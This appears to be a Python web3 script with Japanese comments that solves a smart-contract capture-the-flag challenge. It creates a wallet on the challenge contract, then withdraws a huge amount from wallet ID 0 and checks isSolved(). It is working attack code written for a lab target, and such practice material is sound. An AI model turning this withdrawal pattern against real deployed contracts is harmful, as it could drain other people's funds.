
from web3 import Web3
import json

# ユーザーからの入力を取得
rpc_endpoint = input("RPCエンドポイントURLを入力してください: ")
private_key = input("プライベートキーを入力してください: ")
contract_address = input("チャレンジコントラクトのアドレスを入力してください: ")

# ブロックチェーンへの接続
w3 = Web3(Web3.HTTPProvider(rpc_endpoint))
assert w3.is_connected(), "ブロックチェーンへの接続に失敗しました"

# コントラクトABIの定義
contract_abi = [
    {
        "inputs": [
            {"internalType": "bytes32", "name": "name", "type": "bytes32"}
        ],
        "name": "createWallet",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "uint256", "name": "walletId", "type": "uint256"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "withdraw",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [
            {"internalType": "bool", "name": "", "type": "bool"}
        ],
        "stateMutability": "view",
        "type": "function"
    }
]

# コントラクトの定義
contract = w3.eth.contract(address=w3.to_checksum_address(contract_address), abi=contract_abi)

# アカウントの設定
account = w3.eth.account.from_key(private_key)

# ウォレット名の設定（bytes32型に変換）
wallet_name = w3.to_bytes(text="MyWallet").ljust(32, b'\0')

# ウォレット作成トランザクションの構築
create_wallet_txn = contract.functions.createWallet(wallet_name).build_transaction({
    'from': account.address,
    'value': w3.to_wei(1_000_000_000_000, 'ether'),
    'nonce': w3.eth.get_transaction_count(account.address),
    'gas': 3000000,
    'gasPrice': w3.to_wei('20', 'gwei')
})

# トランザクションの署名と送信
tx_create = w3.eth.account.sign_transaction(create_wallet_txn, private_key)
tx_create_hash = w3.eth.send_raw_transaction(tx_create.raw_transaction)
w3.eth.wait_for_transaction_receipt(tx_create_hash)
print(f"ウォレット作成トランザクションハッシュ: {tx_create_hash.hex()}")

# 資金引き出しトランザクションの構築
withdraw_txn = contract.functions.withdraw(0, w3.to_wei(1_000_000_000_000, 'ether')).build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gas': 3000000,
    'gasPrice': w3.to_wei('20', 'gwei')
})

# トランザクションの署名と送信
tx_withdraw = w3.eth.account.sign_transaction(withdraw_txn, private_key)
tx_withdraw_hash = w3.eth.send_raw_transaction(tx_withdraw.raw_transaction)
w3.eth.wait_for_transaction_receipt(tx_withdraw_hash)
print(f"引き出しトランザクションハッシュ: {tx_withdraw_hash.hex()}")

# チャレンジが解決されたか確認
is_solved = contract.functions.isSolved().call()
print(f"チャレンジ解決済み: {is_solved}")

